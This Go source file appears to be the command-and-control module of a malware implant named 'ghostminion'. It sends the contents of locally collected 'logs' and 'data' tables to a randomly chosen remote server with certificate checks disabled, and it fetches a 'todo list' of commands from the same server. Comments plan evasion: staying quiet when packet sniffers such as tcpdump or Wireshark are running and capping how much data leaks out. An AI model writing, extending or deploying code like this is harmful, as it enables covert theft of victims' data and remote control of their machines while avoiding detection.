package communication

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"ghostminion/config"
	"ghostminion/db"
	"io"
	"math/rand"
	"net/http"
	"time"
)

/*
for x time send an HTTPS packet to one of the given servers. (this will be in main)
before connection.
check if can communicate.
after connection.
	- send logs and data (first logs and then data).
	- get a "todo list".
*/

var serverConfig config.ServerConfig

func communicate() []byte {
	if !canCommunicate() {
		return nil
	}
	serverConfig = getRandomServer()
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // todo remove this.
			},
		},
		Timeout: 60 * time.Second,
	}

	handleTableDataLeak("logs", client)
	handleTableDataLeak("data", client)

	todos := askForTodos(client)
	return todos
}

func handleTableDataLeak(table string, client *http.Client) {
	receptionRoute := fmt.Sprintf("https://%s:%d/reception", serverConfig.Address, serverConfig.Port)
	for {
		result, err := db.ReadOldestDataRow(table)
		if err != nil {
			return
		}

		jsonData, err := json.Marshal(result)
		if err != nil {
			return
		}

		reader := bytes.NewReader(jsonData)
		if reader == nil {
			return
		}
		_, _ = client.Post(receptionRoute, "application/json", reader)
	}
}

func askForTodos(client *http.Client) []byte {
	todosRoute := fmt.Sprintf("https://%s:%d/todos", serverConfig.Address, serverConfig.Port)

	resp, err := client.Get(todosRoute)
	if err != nil {
		fmt.Println("Error:", err)
		return nil
	}
	defer resp.Body.Close()

	todos, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return nil
	}
	return todos
}

func getRandomServer() config.ServerConfig {
	servers := config.Instance.Communication.Servers
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	index := rng.Intn(len(servers))
	return servers[index]
}

func canCommunicate() bool {
	/*
		don't send too much data (its a little risky) - make leak limit
		don't communicate if there are sniffers (tcpdump, wireshark, etc..)
		don't communicate if there is too much cpu usage
		todo: search for more risky communication times
	*/
	return true
}
